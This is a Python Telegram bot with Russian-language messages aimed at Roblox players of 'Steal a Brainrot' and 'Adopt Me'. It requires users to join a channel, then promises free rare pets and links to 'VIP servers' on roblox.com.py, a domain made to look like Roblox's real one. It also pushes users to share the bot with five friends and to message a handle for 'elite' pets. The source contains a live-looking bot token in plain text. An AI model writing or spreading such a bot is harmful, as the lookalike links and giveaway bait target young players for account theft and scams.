import os
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler

# ⚡ ПЕРЕМЕННЫЕ ВПИСАНЫ ПРЯМО В КОД
BOT_TOKEN = "8172470730:AAFB7nEApUWtwKwXPxAXNES693p0JM-DGsM"
CHANNEL_USERNAME = "@StealABrainroatFree"
CHANNEL_LINK = "https://t.me/StealABrainroatFree"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def check_subscription(user_id, bot):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Ошибка проверки подписки: {e}")
        return False

async def start(update, context):
    user = update.effective_user
    
    if not await check_subscription(user.id, context.bot):
        keyboard = [
            [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url=CHANNEL_LINK)],
            [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🎮 *Добро пожаловать!*\n\n"
            "📢 *Для использования бота нужно подписаться на наш канал*\n\n"
            "✨ *После подписки нажми кнопку* '✅ Я ПОДПИСАЛСЯ'",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🧠 Brainrot", callback_data="brainrot")],
        [InlineKeyboardButton("🐉 Adopt Me", callback_data="adoptme")],
        [InlineKeyboardButton("🎁 Получить Элитного Брейнрота", callback_data="elite_brainrot")],
        [InlineKeyboardButton("🐢 Получить Элитных Петов", callback_data="elite_pets")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = f"👋 *Привет {user.first_name}! Ты попал в бота* 🎮\n\n" + \
                   "🎯 *Выбери команду:*"
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def brainrot_command(update, context):
    user = update.effective_user
    
    if not await check_subscription(user.id, context.bot):
        await update.message.reply_text(
            "❌ *Сначала подпишись на канал!*\n\n"
            "🔧 *Используй* `/start` *для проверки подписки*",
            parse_mode='Markdown'
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🎯 VIP СЕРВЕР", url="https://roblox.com.py/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=84292186981580178147800926986646")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    free_text = "🎮 *STEAL A BRAINROT - ВИП ДОСТУП* 🎮\n\n" + \
                "🔥 *ПЕРВЫМ 5 ЧЕЛОВЕКАМ - ЛОС МОБИЛОС* 🔥\n\n" + \
                "⚡ *ЗАХОДИ ПОКА НЕ ЗАКРЫЛИ ВИПКУ* ⚡\n\n" + \
                "👇 *Нажми на кнопку ниже чтобы попасть на вип сервер* 👇"
    
    await update.message.reply_text(free_text, reply_markup=reply_markup, parse_mode='Markdown')

async def adoptme_command(update, context):
    user = update.effective_user
    
    if not await check_subscription(user.id, context.bot):
        await update.message.reply_text(
            "❌ *Сначала подпишись на канал!*\n\n"
            "🔧 *Используй* `/start` *для проверки подписки*",
            parse_mode='Markdown'
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🐉 VIP СЕРВЕР", url="https://roblox.com.py/games/920587237/Adopt-Me?privateServerLinkCode=84292186981580178147800926986646")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    adopt_text = "🐉 *ADOPT ME - ВИП ДОСТУП* 🐉\n\n" + \
                 "🌟 *ПЕРВЫМ 5 ЧЕЛОВЕКАМ - ФР ЧЕРЕПАХУ/ФР ДРАКОНА* 🌟\n\n" + \
                 "⚡ *ЗАХОДИ ПОКА НЕ ЗАКРЫЛИ ВИПКУ* ⚡\n\n" + \
                 "👇 *Нажми на кнопку ниже чтобы попасть на вип сервер* 👇"
    
    await update.message.reply_text(adopt_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_callback(update, context):
    query = update.callback_query
    await query.answer()
    
    if query.data == "check_subscription":
        user = query.from_user
        
        if await check_subscription(user.id, context.bot):
            keyboard = [
                [InlineKeyboardButton("🧠 Brainrot", callback_data="brainrot")],
                [InlineKeyboardButton("🐉 Adopt Me", callback_data="adoptme")],
                [InlineKeyboardButton("🎁 Получить Элитного Брейнрота", callback_data="elite_brainrot")],
                [InlineKeyboardButton("🐢 Получить Элитных Петов", callback_data="elite_pets")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            welcome_text = f"✅ *Отлично, {user.first_name}! Теперь у тебя есть доступ к боту!* 🎉\n\n" + \
                          "🎯 *Выбери команду:*"
            await query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
        else:
            keyboard = [
                [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url=CHANNEL_LINK)],
                [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ *Ты еще не подписался на канал!*\n\n"
                "📝 *Пожалуйста, подпишись и нажми кнопку* '✅ Я ПОДПИСАЛСЯ'",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
    
    elif query.data == "brainrot":
        user = query.from_user
        
        if not await check_subscription(user.id, context.bot):
            await query.answer("❌ Сначала подпишись на канал!", show_alert=True)
            return
        
        keyboard = [
            [InlineKeyboardButton("🎯 VIP СЕРВЕР", url="https://roblox.com.py/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=84292186981580178147800926986646")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        free_text = "🎮 *STEAL A BRAINROT - ВИП ДОСТУП* 🎮\n\n" + \
                    "🔥 *ПЕРВЫМ 5 ЧЕЛОВЕКАМ - ЛОС МОБИЛОС* 🔥\n\n" + \
                    "⚡ *ЗАХОДИ ПОКА НЕ ЗАКРЫЛИ ВИПКУ* ⚡\n\n" + \
                    "👇 *Нажми на кнопку ниже чтобы попасть на вип сервер* 👇"
        
        await query.edit_message_text(free_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    elif query.data == "adoptme":
        user = query.from_user
        
        if not await check_subscription(user.id, context.bot):
            await query.answer("❌ Сначала подпишись на канал!", show_alert=True)
            return
        
        keyboard = [
            [InlineKeyboardButton("🐉 VIP СЕРВЕР", url="https://roblox.com.py/games/920587237/Adopt-Me?privateServerLinkCode=84292186981580178147800926986646")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        adopt_text = "🐉 *ADOPT ME - ВИП ДОСТУП* 🐉\n\n" + \
                     "🌟 *ПЕРВЫМ 5 ЧЕЛОВЕКАМ - ФР ЧЕРЕПАХУ/ФР ДРАКОНА* 🌟\n\n" + \
                     "⚡ *ЗАХОДИ ПОКА НЕ ЗАКРЫЛИ ВИПКУ* ⚡\n\n" + \
                     "👇 *Нажми на кнопку ниже чтобы попасть на вип сервер* 👇"
        
        await query.edit_message_text(adopt_text, reply_markup=reply_markup, parse_mode='Markdown')
    
    elif query.data == "elite_brainrot":
        user = query.from_user
        
        if not await check_subscription(user.id, context.bot):
            await query.answer("❌ Сначала подпишись на канал!", show_alert=True)
            return
        
        elite_text = "🎁 *ПОЛУЧИ ЭЛИТНОГО БРЕЙНРОТА!* 🎁\n\n" + \
                    "🌟 *Чтобы получить самого крутого брейнрота:*\n\n" + \
                    "📢 *1. Расскажи друзьям о нашем боте*\n" + \
                    "👥 *2. Поделись ботом в чатах*\n" + \
                    "🔄 *3. Отправь ссылку на бота 5 друзьям*\n\n" + \
                    "✅ *После выполнения всех пунктов:*\n" + \
                    "💌 *Напиши мне:* @Verywell222\n\n" + \
                    "⚡ *И получи самого мощного брейнрота!* ⚡"
        
        await query.edit_message_text(elite_text, parse_mode='Markdown')
    
    elif query.data == "elite_pets":
        user = query.from_user
        
        if not await check_subscription(user.id, context.bot):
            await query.answer("❌ Сначала подпишись на канал!", show_alert=True)
            return
        
        elite_pets_text = "🐢 *ПОЛУЧИ ЭЛИТНЫХ ПЕТОВ!* 🐢\n\n" + \
                         "🌟 *Чтобы получить элитных питомцев:*\n\n" + \
                         "📢 *1. Расскажи друзьям о нашем боте*\n" + \
                         "👥 *2. Поделись ботом в чатах*\n" + \
                         "🔄 *3. Отправь ссылку на бота 5 друзьям*\n\n" + \
                         "✅ *После выполнения всех пунктов:*\n" + \
                         "💌 *Напиши мне:* @Verywell222\n\n" + \
                         "🎁 *И получи элитных питомцев: ФР ЧЕРЕПАХУ, ФР ДРАКОНА и других!* 🎁"
        
        await query.edit_message_text(elite_pets_text, parse_mode='Markdown')

async def handle_message(update, context):
    user = update.effective_user
    
    if not await check_subscription(user.id, context.bot):
        await update.message.reply_text(
            "❌ *Сначала подпишись на канал!*\n\n"
            "🔧 *Используй* `/start` *для проверки подписки*",
            parse_mode='Markdown'
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("🧠 Brainrot", callback_data="brainrot")],
        [InlineKeyboardButton("🐉 Adopt Me", callback_data="adoptme")],
        [InlineKeyboardButton("🎁 Получить Элитного Брейнрота", callback_data="elite_brainrot")],
        [InlineKeyboardButton("🐢 Получить Элитных Петов", callback_data="elite_pets")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎮 *Выбери команду:*",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("brainrot", brainrot_command))
    application.add_handler(CommandHandler("adoptme", adoptme_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Бот запущен на CodeSandbox!")
    application.run_polling()

if __name__ == '__main__':
    main()
